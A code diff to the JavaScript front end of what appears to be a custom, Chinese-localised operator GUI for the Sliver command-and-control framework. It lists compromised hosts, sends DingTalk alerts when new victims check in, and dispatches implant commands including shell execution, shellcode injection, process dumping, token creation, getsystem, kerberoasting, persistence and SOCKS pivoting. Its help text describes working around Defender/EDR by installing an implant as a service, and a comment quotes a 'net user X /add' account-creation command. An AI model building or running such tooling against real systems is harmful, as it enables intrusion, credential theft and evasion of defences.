@@ -10,6 +10,7 @@ const internalIPMap = {};
 const internalIPPending = new Set();
 const internalIPRetryAt = {};
 let pivotTree = [];                  // pivot topology from GetPivotGraph RPC
+let infrastructurePanelState = null;
 // Graph interaction state (persists across refreshes).
 const graphPos = {};                 // agent id -> {x,y} in graph coords
 const graphDrag = {};                // agent id -> {x,y} dragged position override
@@ -29,6 +30,11 @@ const taskStore = TaskStore.createTaskStore({ limit: 100 });
 let taskCenterFilter = 'all';
 const taskActions = new Map();
 const beaconPolls = new Map();
+let activeModalID = '';
+let officialTerminal = null;
+let officialFitAddon = null;
+let officialResizeObserver = null;
+let officialConsoleWriteChain = Promise.resolve();
 const NOTIFICATION_SETTINGS_KEY = 'sliver-gui:notifications';
 const defaultNotificationSettings = {
   enabled: true, desktop: false, minimumLevel: 'info', quietStart: '', quietEnd: '',
@@ -64,27 +70,34 @@ function notifyOperational(event) {
 let persistKey = null;        // set once we know which teamserver we're on
 let saveTimer = null;
 function persistScope(teamserver) { persistKey = 'sliver-gui:' + (teamserver || 'default'); }
-function saveState() {
+function saveState(immediate = false) {
   if (!persistKey) return;
   clearTimeout(saveTimer);
-  saveTimer = setTimeout(() => {
+  const write = () => {
     try {
       localStorage.setItem(persistKey, JSON.stringify({
         notes: notesMap, integrity: integrityMap, graph: graphPos,
+        dismissedOfflineAgents: [...dismissedOfflineAgents],
         workspace: Object.fromEntries(Object.entries(openTabs).filter(([, value]) => value.obj).map(([id, value]) => [id, value.workspaceView || 'terminal'])),
-        v: 2,
+        v: 3,
       }));
     } catch (e) { /* quota/private-mode: state stays in-memory only */ }
-  }, 300);
+  };
+  if (immediate) write();
+  else saveTimer = setTimeout(write, 300);
 }
 function loadState() {
   if (!persistKey) return;
+  dismissedOfflineAgents.clear();
   let data;
   try { data = JSON.parse(localStorage.getItem(persistKey) || '{}'); } catch (e) { return; }
   if (!data || typeof data !== 'object') return;
   Object.assign(notesMap, data.notes || {});
   Object.assign(integrityMap, data.integrity || {});
   Object.assign(graphPos, data.graph || {});
+  if (Array.isArray(data.dismissedOfflineAgents)) {
+    data.dismissedOfflineAgents.filter(id => typeof id === 'string' && id).forEach(id => dismissedOfflineAgents.add(id));
+  }
   window.savedWorkspaceViews = data.workspace || {};
 }
 
@@ -319,14 +332,17 @@ async function enterApp(info) {
   agentNotificationState.reset(allSessions, allBeacons);
   wireEventStream();
   pinServerConsole();     // Server console docked by default
+  wireOfficialConsoleStream();
   pinEvents();            // Event Log docked in the console by default
-  pinScripts();           // Script Manager docked in the console by default
   pollTimer = setInterval(refreshAgents, 5000);
 }
 
 document.getElementById('disconnect-btn').addEventListener('click', async () => {
   clearInterval(pollTimer);
-  if (window.runtime) { window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); }
+  if (window.runtime) {
+    window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected');
+    window.runtime.EventsOff('official-console:output'); window.runtime.EventsOff('official-console:exit');
+  }
   await App().Disconnect();
   document.getElementById('app-shell').classList.add('hidden');
   document.getElementById('connect-overlay').classList.remove('hidden');
@@ -382,7 +398,9 @@ async function handleAgentOnline(kind, agent) {
   if (error) toastRpcError(error, '钉钉上线通知发送失败');
 }
 function logEvent(ev) {
-  eventLog.unshift({ time: new Date().toLocaleTimeString(), type: ev.type||'unknown', detail: ev.session ? `${ev.session.hostname} (${ev.session.os}) ${ev.session.username||''}` : (ev.data||'') });
+  const agent = ev.session || ev.beacon;
+  const detail = agent ? `${agent.hostname || agent.id || '未知主机'} (${agent.os || '未知系统'}) ${agent.username || ''}` : (ev.data || '');
+  eventLog.unshift({ time: new Date().toLocaleTimeString(), type: ev.type||'unknown', detail });
   if (eventLog.length > EVENT_MAX) eventLog.length = EVENT_MAX;
   renderEventsList(); // live-update any open/pinned event views
 }
@@ -419,8 +437,9 @@ async function refreshAgents(establishBaseline = false) {
   }
   if (sessions) allSessions = sessions;
   if (beacons) allBeacons = beacons;
+  let dismissedChanged = false;
   [...allSessions, ...allBeacons].forEach(agent => {
-    if (!agent.isDead) dismissedOfflineAgents.delete(agent.id);
+    if (!agent.isDead && dismissedOfflineAgents.delete(agent.id)) dismissedChanged = true;
   });
   if (graph) pivotTree = graph;
   let integrityChanged = false;
@@ -431,7 +450,7 @@ async function refreshAgents(establishBaseline = false) {
       integrityChanged = true;
     }
   });
-  if (integrityChanged) saveState();
+  if (integrityChanged || dismissedChanged) saveState();
   allSessions.forEach(agent => probeAgentIntegrity('session', agent));
   allBeacons.forEach(agent => probeAgentIntegrity('beacon', agent));
   allSessions.forEach(agent => loadInternalIP(agent));
@@ -443,6 +462,7 @@ async function refreshAgents(establishBaseline = false) {
   updateAgentCount();
   renderTable();
   refreshOpenAgentHeaders();
+  syncAgentDependentPanels();
   if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
   refreshListenerHealth();
 }
@@ -505,8 +525,52 @@ async function loadInternalIP(agent) {
   renderTable();
 }
 function visibleAgents() {
-  if (agentListFilter === 'beacons') return allBeacons.filter(obj => !dismissedOfflineAgents.has(obj.id)).map(obj => ({ kind:'beacon', obj }));
-  return allSessions.filter(obj => !dismissedOfflineAgents.has(obj.id)).map(obj => ({ kind:'session', obj }));
+  if (agentListFilter === 'beacons') return visibleBeacons().map(obj => ({ kind:'beacon', obj }));
+  return visibleSessions().map(obj => ({ kind:'session', obj }));
+}
+function visibleSessions() {
+  return allSessions.filter(session => session.id && !dismissedOfflineAgents.has(session.id));
+}
+function visibleBeacons() {
+  return allBeacons.filter(beacon => beacon.id && !dismissedOfflineAgents.has(beacon.id));
+}
+function availableSessions() {
+  return visibleSessions().filter(session => !session.isDead);
+}
+function sessionOptionLabel(session) {
+  return `${session.hostname || session.name || session.id.slice(0, 8)} (${session.remoteAddress || '地址未知'})`;
+}
+function replaceSessionOptions(select, sessions, emptyLabel, requireSelection = false) {
+  if (!select) return false;
+  const previous = select.value;
+  const validIDs = new Set(sessions.map(session => session.id));
+  const placeholder = requireSelection
+    ? (sessions.length ? '' : `<option value="">${esc(emptyLabel)}</option>`)
+    : `<option value="">${esc(emptyLabel)}</option>`;
+  select.innerHTML = placeholder + sessions.map(session => `<option value="${esc(session.id)}">${esc(sessionOptionLabel(session))}</option>`).join('');
+  if (validIDs.has(previous)) select.value = previous;
+  else if (!requireSelection || !sessions.length) select.value = '';
+  select.disabled = sessions.length === 0;
+  return Boolean(previous && !validIDs.has(previous));
+}
+function syncScriptSessionSelectors() {
+  const sessions = availableSessions();
+  document.querySelectorAll('.scripts-panel #scr-session').forEach(select => {
+    const invalidated = replaceSessionOptions(select, sessions, '-- 选择跳板会话 --');
+    select.dispatchEvent(new Event('change'));
+    if (invalidated) {
+      const root = select.closest('.scripts-panel');
+      const out = root?.querySelector('#scr-output');
+      if (out) {
+        out.textContent = '[!] 原跳板会话已离线或被隐藏，请重新选择在线 Session';
+        out.style.color = 'var(--accent)';
+      }
+    }
+  });
+}
+function syncAgentDependentPanels() {
+  syncScriptSessionSelectors();
+  syncInfrastructurePanel();
 }
 function updateAgentCount() {
   const count = visibleAgents().length;
@@ -551,7 +615,9 @@ document.getElementById('clear-offline-btn').addEventListener('click', async () 
   if (!offline.length) return toast('info', '当前列表没有离线主机');
   if (!(await uiConfirm(`确定从当前客户端视图隐藏 ${offline.length} 个离线${agentListFilter === 'beacons' ? '信标' : '会话'}吗？\n不会删除 Teamserver 数据，也不会向目标发送命令。`, { title:'清空离线主机', okLabel:'清空' }))) return;
   offline.forEach(agent => dismissedOfflineAgents.add(agent.id));
+  saveState(true);
   updateAgentCount(); renderTable();
+  syncAgentDependentPanels();
   if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
   toast('ok', `已隐藏 ${offline.length} 个离线主机`);
 });
@@ -989,6 +1055,7 @@ ctxMenu.addEventListener('click', async event => {
   if (action === 'files') return openFileBrowser(obj.id);
   if (action === 'upload') return uploadFromContext(obj);
   if (action === 'processes') return openProcessBrowser(obj.id);
+  if (action === 'interactive-shell') return openInteractiveShell(obj.id, obj);
   if (action === 'spawn') return openSpawnDialog(obj);
   if (action === 'interactive-session') return requestInteractiveSession(obj);
   if (action === 'beacon-timing') return openBeaconTimingDialog(obj);
@@ -1043,11 +1110,29 @@ function openAgentOverview(kind, obj) {
 }
 
 async function openAgentScreenshot(obj) {
-  openViewPanel('_agent-screenshot', `屏幕截图 - ${obj.hostname || obj.id.slice(0,8)}`, '<div class="infra-loading"><span class="spinner"></span>正在截取屏幕...</div>');
-  const result = await App().TakeScreenshot(obj.id).then(data => ({ data })).catch(error => ({ error }));
+  const requestID = `screenshot-${Date.now()}-${Math.random().toString(36).slice(2)}`;
+  openViewPanel('_agent-screenshot', `保存屏幕截图 - ${obj.hostname || obj.id.slice(0,8)}`, '<div class="infra-loading"><span class="spinner"></span>正在截取屏幕并保存到程序运行目录...</div>');
+  const loadingBody = document.getElementById('modal-body');
+  if (loadingBody) loadingBody.dataset.screenshotRequest = requestID;
+  const result = await App().SaveScreenshot(obj.id, obj.hostname || obj.name || '').then(transfer => ({ transfer })).catch(error => ({ error }));
   const body = document.getElementById('modal-body');
-  if (result.error) body.innerHTML = rpcErrorHtml(result.error, '截取屏幕失败');
-  else body.innerHTML = `<div class="screenshot-preview"><img src="${result.data}" alt="${esc(obj.hostname || '目标')} 的屏幕截图"/></div>`;
+  if (!body || body.dataset.screenshotRequest !== requestID) return;
+  delete body.dataset.screenshotRequest;
+  if (result.error) {
+    body.innerHTML = rpcErrorHtml(result.error, '截取屏幕失败');
+    return;
+  }
+  if (result.transfer?.error) {
+    const info = rpcError(result.transfer.error, '保存屏幕截图失败');
+    body.innerHTML = rpcErrorHtml(result.transfer.error, '保存屏幕截图失败');
+    return;
+  }
+  if (!result.transfer?.path) {
+    body.innerHTML = rpcErrorHtml(new Error('screenshot save returned no local path'), '保存屏幕截图失败');
+    return;
+  }
+  body.innerHTML = `<div class="agent-overview"><div><span>保存位置</span><strong>${esc(result.transfer.path)}</strong></div><div><span>文件大小</span><strong>${esc(fmtSize(Number(result.transfer.bytes || 0)))}</strong></div></div>`;
+  toast('ok', `屏幕截图已保存到 ${result.transfer.path}`, 7000);
 }
 
 async function openAgentNetwork(obj) {
@@ -1165,18 +1250,19 @@ async function openSpawnDialog(obj) {
 
 // ── Interaction panel ──────────────────────────────────────────────────────
 const AGENT_COMMAND_SCHEMA = {
-  commands: [
+  commands: [...new Set([
     'help','info','clear','shell','pty','execute','grep','mount','memfiles','ssh','ps','ls','cd','pwd',
     'download','upload','cat','mkdir','rm','mv','cp','screenshot','netstat','ifconfig','env','getenv',
-    'setenv','unsetenv','reg','whoami','getprivs','procdump','kill','loot','chmod','chown','getsystem',
+    'setenv','unsetenv','reg','whoami','getprivs','getpid','getuid','getgid','procdump','kill','terminate','loot','chmod','chown','getsystem',
     'make-token','impersonate','rev2self','runas','migrate','execute-assembly','execute-shellcode','sideload',
-    'spawndll','extensions','ext','wasm','execute-windows','ping','wg-forwarders','wg-list-socks','close',
-    'backdoor','dllhijack','msf','msf-inject','socks','portfwd','rportfwd','wg-portfwd','wg-socks','pivot',
+    'spawndll','extensions','ext-list','ext','wasm','execute-windows','execw','ping','wg-forwarders','wg-list-socks','close',
+    'backdoor','dllhijack','msf','msf-inject','socks','socks5','portfwd','rportfwd','wg-portfwd','wg-socks','pivot',
     'services','tasks','reconfig','interactive','spawn','jump','privesc-check','harvest','ad-enum','local-enum',
-    'kerberoast','persist','scan',
-  ],
+    'kerberoast','persist','scan','rmdir','ipconfig','privesc','adenum','localenum',
+    ...Object.keys(window.OfficialCommandSpecs?.agent || {}).filter(command => !command.includes(' ')),
+  ])],
   arguments: {
-    socks: { 0: ['start','stop','status'] }, portfwd: { 0: ['add','rm','list'] },
+    socks: { 0: ['start','add','stop','status'] }, socks5: { 0: ['start','add','stop','status'] }, portfwd: { 0: ['add','rm','list'] },
     rportfwd: { 0: ['add','rm','list'] }, 'wg-portfwd': { 0: ['add','rm'] },
     pivot: { 0: ['start','stop','list'], 1: ['tcp','pipe'] },
     services: { 0: ['detail','start'] }, loot: { 0: ['add','rm'] },
@@ -1199,6 +1285,17 @@ function attachCommandCompletion(input, schema, dynamicCandidates) {
         `<span class="${index === active ? 'active' : ''}">${esc(value)}</span>`).join('');
     },
   });
+}
+
+function agentDynamicCompletions({ command, token }) {
+  const specs = window.OfficialCommandSpecs?.agent || {};
+  const resolved = CommandContract.resolve(command, token.words.slice(1), specs);
+  const guiSpec = window.GuiCommandSpecs?.agent?.[command];
+  const activeSpec = guiSpec?.overrideOfficialContract ? guiSpec : (resolved.spec || guiSpec);
+  const candidates = [];
+  if (token.prefix.startsWith('-')) candidates.push(...CommandContract.optionCandidates(activeSpec));
+  if (!token.prefix.startsWith('-') && !guiSpec?.overrideOfficialContract) candidates.push(...(resolved.spec?.subcommands || []));
+  return candidates;
 }
 
 function openInteract(kind, obj) {
@@ -1279,7 +1376,7 @@ function openInteract(kind, obj) {
   // Wire input
   const inp = document.getElementById(`cinp-${id}`);
   const hist = []; let hIdx = -1;
-  attachCommandCompletion(inp, AGENT_COMMAND_SCHEMA);
+  attachCommandCompletion(inp, AGENT_COMMAND_SCHEMA, agentDynamicCompletions);
   inp.addEventListener('keydown', e => {
     if (e.key === 'Enter') { runAgentCmd(kind, id, inp, hist); hIdx = -1; }
     if (e.key === 'ArrowUp') { if (hIdx < hist.length-1) { hIdx++; inp.value = hist[hIdx]; } e.preventDefault(); }
@@ -1591,7 +1688,7 @@ function closeTab(id) {
 // ── Command execution ──────────────────────────────────────────────────────
 const HELP_TEXT = `
 Core commands (session & beacon):
-  help                       Show this help
+  help [command]             Show command list or detailed command help
   info                       Show agent info
   clear                      Clear the console
   shell <cmd>                Run a command in the OS shell (raw text works too)
@@ -1652,7 +1749,7 @@ Privilege / execution (session only):
   msf-inject <payload> <lhost> <lport> <pid>  Inject an msf payload into a PID
 
 Pivoting / tunneling (session only):
-  socks start <port>|stop|status
+  socks5 start <port>|stop|status   In-band SOCKS5（别名：socks；官网旧文档也使用 add）
   portfwd add <lport> <rhost> <rport> | rm <lport> | list
   rportfwd add <bindport> <fwdhost> <fwdport> | rm <id> | list
   wg-portfwd add <lport> <rhost:port> | rm <id>   (WireGuard implants)
@@ -1692,6 +1789,125 @@ Scripts (session & beacon — auto-generate + deploy):
     profiles new --http 10.10.10.1:8080 --os linux --arch amd64 --beacon --name lin-http
 `.trim();
 
+const AGENT_COMMAND_HELP = [
+  { names:['shell'], usage:'shell <command> | shell -i', summary:'通过目标操作系统 Shell 执行命令；Session 可使用 -i 打开实时交互式 Shell。', scope:'Session 和 Beacon（-i 仅 Session）' },
+  { names:['pty'], usage:'pty', summary:'打开实时交互式 PTY Shell，等价于 shell -i。', scope:'仅 Session' },
+  { names:['execute'], usage:'execute <程序路径> [参数...]', summary:'不经过 Shell 包装器，直接启动目标程序。', scope:'Session；Beacon 会异步排队' },
+  { names:['reg'], usage:'reg query|read|write|read-hive ...', summary:'读取或写入 Windows 注册表；当前客户端不提供完整的键创建和删除语义。', scope:'Windows 目标' },
+  { names:['socks5','socks'], usage:'socks5 start <端口> | add <端口> | stop | status', summary:'管理目标内带 SOCKS5；add 是官网旧文档中 start 的兼容写法。', scope:'仅 Session' },
+  { names:['pivot'], usage:'pivot start tcp|pipe <绑定地址> | stop <ID> | list', summary:'管理 TCP 或命名管道 Pivot。', scope:'仅 Session' },
+  { names:['download'], usage:'download <远程路径> [本地路径]', summary:'将目标文件下载到操作员本机；省略本地路径时使用保存流程。', scope:'Session；Beacon 会异步排队' },
+  { names:['upload'], usage:'upload <本地路径> <远程路径>', summary:'将操作员本机文件上传到目标。', scope:'仅 Session' },
+  { names:['getprivs'], usage:'getprivs', summary:'读取当前 Windows 令牌权限和完整性信息。', scope:'Session 和 Beacon' },
+  { names:['procdump'], usage:'procdump <PID>', summary:'转储指定进程内存并保存到操作员本机。', scope:'仅 Session' },
+  { names:['extensions','ext-list'], usage:'extensions', summary:'列出已安装并可用于当前目标的扩展与 BOF。', scope:'Session 和 Beacon' },
+  { names:['ext'], usage:'ext <扩展命令> [参数...]', summary:'执行动态安装的 Armory 扩展或 BOF；具体参数以扩展中心显示的 Manifest 为准。', scope:'按扩展平台与目标能力决定' },
+  { names:['reconfig'], usage:'reconfig <间隔秒数> <抖动秒数>', summary:'修改信标回连间隔和抖动，配置在后续签到时生效。', scope:'仅 Beacon' },
+  { names:['interactive'], usage:'interactive', summary:'请求信标创建一个实时 Session。', scope:'仅 Beacon' },
+  { names:['spawn'], usage:'spawn <windows|linux> <架构> <植入体档案>', summary:'使用已有植入体档案生成新的回连。', scope:'Session 和 Beacon，具体投递能力取决于目标' },
+];
+
+function commandHelpDetail(command, schema, entries, overview, consoleName) {
+  const target = String(command || '').trim().toLowerCase();
+  if (!target) return overview;
+  const scope = consoleName === '服务器' ? 'server' : 'agent';
+  const help = CommandContract.helpSpec(
+    target,
+    window.OfficialCommandSpecs?.[scope] || {},
+    window.GuiCommandSpecs?.[scope] || {},
+  );
+  if (help) return CommandContract.formatHelp(help.commandPath, help.spec);
+  const entry = entries.find(item => item.names.includes(target));
+  if (entry) {
+    const aliases = entry.names.filter(name => name !== target);
+    return [
+      `命令：${target}`,
+      `用途：${entry.summary}`,
+      `用法：${entry.usage}`,
+      `范围：${entry.scope}`,
+      aliases.length ? `别名：${aliases.join(', ')}` : '',
+      entry.note ? `说明：${entry.note}` : '',
+    ].filter(Boolean).join('\n');
+  }
+  if (!(schema.commands || []).includes(target)) {
+    return `未找到 ${consoleName}命令“${target}”。输入 help 查看可用命令。`;
+  }
+  const escaped = target.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+  const line = overview.split('\n').find(value => new RegExp(`^\\s*${escaped}(?:\\s|$|\\s*\\|)`, 'i').test(value));
+  const usage = line ? line.trim().replace(/\s{2,}/g, '  ') : target;
+  return `命令：${target}\n用法：${usage}\n范围：${consoleName}控制台\n说明：该命令已注册；输入无参数 help 可在完整命令表中查看相邻工作流。`;
+}
+
+function commandHelpTarget(cmd, args, schema) {
+  return CommandContract.helpTarget(cmd, args, schema.commands || []);
+}
+
+function officialCommandSpec(scope, cmd, args = []) {
+  const specs = window.OfficialCommandSpecs?.[scope] || {};
+  return CommandContract.resolve(cmd, args, specs).spec;
+}
+
+function parseCommandContract(cmd, args, scope) {
+  const guiSpec = window.GuiCommandSpecs?.[scope]?.[cmd] || null;
+  if (guiSpec?.overrideOfficialContract) {
+    const parsed = CommandContract.parse(args, guiSpec);
+    return { ...parsed, spec:guiSpec, official:false, subcommands:[] };
+  }
+  const resolved = CommandContract.resolve(cmd, args, window.OfficialCommandSpecs?.[scope] || {});
+  const official = Boolean(resolved.spec);
+  const spec = resolved.spec || guiSpec;
+  if (!spec) return { args, positionals: args, options: {}, spec: null, error: '' };
+  const subcommands = official ? resolved.subcommands : [];
+  const parsed = CommandContract.parse(official ? resolved.tokens : args, spec);
+  if (parsed.error) return { ...parsed, spec, official, subcommands };
+  const unsupported = CommandContract.unsupportedOptions(parsed, spec);
+  if (unsupported.length) {
+    return {
+      ...parsed,
+      spec,
+      official, subcommands,
+      error: `当前 GUI 尚未映射官方参数 ${unsupported.map(name => `--${name}`).join(', ')}；本次命令未执行。`,
+    };
+  }
+  return { ...parsed, positionals:[...subcommands, ...parsed.positionals], spec, official, subcommands };
+}
+
+const MAPPED_OFFICIAL_SUBCOMMANDS = {
+  agent: new Set([
+    'memfiles add','memfiles rm','wasm ls',
+  ]),
+  server: new Set([
+    'armory install','armory rm','beacons rm','extensions install','hosts rm','loot rename',
+    'monitor start','monitor stop','sessions prune','websites rm',
+  ]),
+};
+
+function unmappedOfficialSubcommand(contract, scope) {
+  if (!contract?.official || !contract?.subcommands?.length) return '';
+  const path = contract.spec?.commandPath || '';
+  return MAPPED_OFFICIAL_SUBCOMMANDS[scope]?.has(path) ? '' : path;
+}
+
+function durationNanoseconds(value) {
+  const match = String(value || '').trim().match(/^([+-]?(?:\d+(?:\.\d+)?|\.\d+))(ns|us|µs|ms|s|m|h)$/i);
+  if (!match) throw new Error(`无效时长 ${value}；请使用 Go 时长格式，例如 500ms、2s、1m。`);
+  const factors = { ns:1, us:1e3, 'µs':1e3, ms:1e6, s:1e9, m:60e9, h:3600e9 };
+  return Math.round(Number(match[1]) * factors[match[2].toLowerCase()]);
+}
+
+function matchesCommandFilter(item, text, regexText) {
+  const searchable = [item.id, item.name, item.hostname, item.username, item.os, item.arch, item.remoteAddress, item.transport]
+    .filter(Boolean).join(' ');
+  if (text && !searchable.toLowerCase().includes(String(text).toLowerCase())) return false;
+  if (regexText) {
+    let expression;
+    try { expression = new RegExp(regexText, 'i'); }
+    catch (error) { throw new Error(`无效正则表达式：${error.message}`); }
+    if (!expression.test(searchable)) return false;
+  }
+  return true;
+}
+
 // Split a command line into tokens, respecting single/double quotes so a quoted
 // argument (e.g. execute cmd.exe /c "net user X /add && ...") stays one token.
 function tok(s) {
@@ -1715,32 +1931,57 @@ async function runAgentCmd(kind, id, inp, hist) {
 }
 
 async function dispatchCmd(kind, id, raw) {
+  return dispatchAgentCommandViaRPC(kind, id, raw);
+}
+
+async function dispatchAgentCommandViaRPC(kind, id, raw) {
   const parts = tok(raw);
   const cmd = parts[0].toLowerCase();
-  const args = parts.slice(1);
+  let args = parts.slice(1);
   const tab = openTabs[id] || {};
 
   // ── universal built-ins ──
-  if (cmd === 'help') return appendOut(id, HELP_TEXT, 'info');
+  const helpTarget = commandHelpTarget(cmd, args, AGENT_COMMAND_SCHEMA);
+  if (helpTarget !== null) return appendOut(id, commandHelpDetail(helpTarget, AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'info');
+  const passthroughCommand = cmd === 'shell' || cmd === 'ext';
+  const contract = passthroughCommand
+    ? { args, positionals:args, options:{}, spec:window.GuiCommandSpecs?.agent?.[cmd] || null, official:false, error:'' }
+    : parseCommandContract(cmd, args, 'agent');
+  if (contract.error) return appendOut(id, `[错误] ${contract.error}`, 'err');
+  const unmappedSubcommand = unmappedOfficialSubcommand(contract, 'agent');
+  if (unmappedSubcommand && cmd !== 'shell') {
+    return appendOut(id, `[错误] 官方子命令 ${unmappedSubcommand} 尚未在 GUI 中映射；本次命令未执行。可输入 official-console 在官方客户端中使用。`, 'err');
+  }
+  const commandArgs = contract.positionals;
+  const options = contract.options;
+  args = commandArgs;
+
   if (cmd === 'clear') { const o = document.getElementById(`cout-${id}`); if (o) o.innerHTML = ''; return; }
-  if (cmd === 'info') { const o = tab.obj; return appendOut(id, `ID: ${o.id}\nHost: ${o.hostname}\nUser: ${o.username}\nOS: ${o.os}/${o.arch}\nPID: ${o.pid}\nTransport: ${o.transport}\nRemote: ${o.remoteAddress}`, 'info'); }
-  if (cmd === 'tasks' && kind === 'beacon') return showTasks(id);
-  if (cmd === 'getprivs') return runGetPrivsCommand(kind, id, tab.obj);
   if ((cmd === 'shell' && (!args.length || args[0] === '-i')) || cmd === 'pty') {
     if (kind !== 'session') return appendOut(id, '[!] interactive shell requires a session (beacons are async). For a beacon use: shell <command>', 'err');
     return openInteractiveShell(id, tab.obj);
   }
 
+  if (cmd === 'info') { const o = tab.obj; return appendOut(id, `ID: ${o.id}\nHost: ${o.hostname}\nUser: ${o.username}\nOS: ${o.os}/${o.arch}\nPID: ${o.pid}\nTransport: ${o.transport}\nRemote: ${o.remoteAddress}`, 'info'); }
+  if (cmd === 'tasks' && kind === 'beacon') return showTasks(id);
+  if (cmd === 'getprivs') return runGetPrivsCommand(kind, id, tab.obj);
+
   // ── beacons: queue command, then poll for the result (non-blocking) ──
   if (kind === 'beacon') {
     if (cmd === 'reconfig') {
-      if (args.length < 2) return appendOut(id, 'usage: reconfig <interval_sec> <jitter_sec>', 'err');
-      await App().ReconfigureBeacon(id, parseInt(args[0]), parseInt(args[1]));
-      return appendOut(id, `[+] reconfigure queued — interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
+      if (!options['beacon-interval'] && !options['beacon-jitter']) return appendOut(id, commandHelpDetail('reconfig', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
+      const interval = options['beacon-interval'] ? durationNanoseconds(options['beacon-interval']) / 1e9 : Math.max(1, Math.round(Number(tab.obj?.interval || 60000000000) / 1e9));
+      const jitter = options['beacon-jitter'] ? durationNanoseconds(options['beacon-jitter']) / 1e9 : Math.max(0, Math.round(Number(tab.obj?.jitter || 0) / 1e9));
+      await App().ReconfigureBeacon(id, interval, jitter);
+      return appendOut(id, `[+] reconfigure queued — interval ${interval}s / jitter ${jitter}s (applies on next check-in)`, 'ok');
     }
     if (cmd === 'interactive') {
       await App().InteractiveBeacon(id);
       return appendOut(id, '[+] interactive session requested — it will appear as a session on next check-in', 'ok');
+    }
+    if (cmd !== 'shell') {
+      const label = contract.official ? `官方命令 ${contract.spec?.commandPath || cmd}` : `GUI 命令 ${cmd}`;
+      return appendOut(id, `[错误] ${label} 的 Beacon RPC 尚未在 GUI 中映射；本次命令未作为系统 Shell 命令执行。可输入 official-console 在官方客户端中使用。`, 'err');
     }
     const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
     const target = tab.obj?.hostname || id.slice(0, 8);
@@ -1775,8 +2016,21 @@ async function dispatchCmd(kind, id, raw) {
 
   // ── session commands ──
   switch (cmd) {
+    case 'shell': {
+      const shellCmd = args.join(' ');
+      if (!shellCmd.trim()) return;
+      const r = await App().ExecuteCommand(id, shellCmd).catch(e => ({ error: String(e) }));
+      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
+      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
+      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
+      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
+      return;
+    }
     case 'ps': {
-      const procs = await App().GetProcessList(id);
+      let procs = await App().GetProcessList(id);
+      if (options.pid !== undefined && options.pid >= 0) procs = procs.filter(proc => Number(proc.pid) === options.pid);
+      if (options.exe) procs = procs.filter(proc => String(proc.executable || '').toLowerCase().includes(String(options.exe).toLowerCase()));
+      if (options.owner) procs = procs.filter(proc => String(proc.owner || '').toLowerCase().includes(String(options.owner).toLowerCase()));
       let out = 'PID     PPID    OWNER                EXECUTABLE\n';
       procs.forEach(p => { out += `${String(p.pid).padEnd(8)}${String(p.ppid).padEnd(8)}${(p.owner||'').slice(0,20).padEnd(21)}${p.executable||''}\n`; });
       return appendOut(id, out.trimEnd(), 'out');
@@ -1794,7 +2048,11 @@ async function dispatchCmd(kind, id, raw) {
       if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
       tab.cwd = r.path || path;
       let out = `${tab.cwd}\n`;
-      (r.files||[]).forEach(f => { out += `${f.isDir?'d':'-'} ${(f.mode||'').padEnd(11)} ${String(f.isDir?'':fmtSize(f.size)).padStart(9)}  ${f.name}\n`; });
+      const files = [...(r.files || [])];
+      if (options.size) files.sort((a, b) => Number(a.size || 0) - Number(b.size || 0));
+      if (options.modified) files.sort((a, b) => Number(a.modTime || 0) - Number(b.modTime || 0));
+      if (options.reverse) files.reverse();
+      files.forEach(f => { out += `${f.isDir?'d':'-'} ${(f.mode||'').padEnd(11)} ${String(f.isDir?'':fmtSize(f.size)).padStart(9)}  ${f.name}\n`; });
       return appendOut(id, out.trimEnd(), 'out');
     }
     case 'download': {
@@ -1814,9 +2072,9 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'screenshot': {
       appendOut(id, '[*] capturing...', 'pending');
-      const dataUrl = await App().TakeScreenshot(id).catch(e => null);
-      if (!dataUrl) return appendOut(id, '[error] screenshot failed', 'err');
-      return appendImg(id, dataUrl);
+      const result = await App().TakeScreenshot(id).then(dataUrl => ({ dataUrl })).catch(error => ({ error }));
+      if (result.error) return appendOut(id, `[error] ${rpcErrorMessage(result.error, '截取屏幕失败')}`, 'err');
+      return appendImg(id, result.dataUrl);
     }
     case 'netstat': {
       const entries = await App().GetNetstat(id);
@@ -1851,8 +2109,9 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it — watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) — that returns a SYSTEM session directly.', 'info');
     }
     case 'make-token': {
-      if (args.length < 3) return appendOut(id, 'usage: make-token <domain> <username> <password>', 'err');
-      await App().MakeToken(id, args[1], args[0], args.slice(2).join(' '));
+      const domain = options.domain || args[0] || '', username = options.username || args[1] || '', password = options.password || args.slice(2).join(' ');
+      if (!username || !password) return appendOut(id, commandHelpDetail('make-token', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
+      await App().MakeToken(id, username, domain, password);
       return appendOut(id, '[+] token created', 'out');
     }
     case 'impersonate': {
@@ -1875,9 +2134,9 @@ async function dispatchCmd(kind, id, raw) {
       const r = await App().Sideload(id, args[0] || '', args.slice(1).join(' '), '');
       return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
     }
-    case 'socks': {
+    case 'socks': case 'socks5': {
       const sub = (args[0]||'').toLowerCase();
-      if (sub === 'start') { await App().StartSocksProxy(id, parseInt(args[1])||1080); return appendOut(id, `[+] SOCKS5 on 127.0.0.1:${parseInt(args[1])||1080}`, 'out'); }
+      if (sub === 'start' || sub === 'add') { await App().StartSocksProxy(id, parseInt(args[1])||1080); return appendOut(id, `[+] SOCKS5 on 127.0.0.1:${parseInt(args[1])||1080}`, 'out'); }
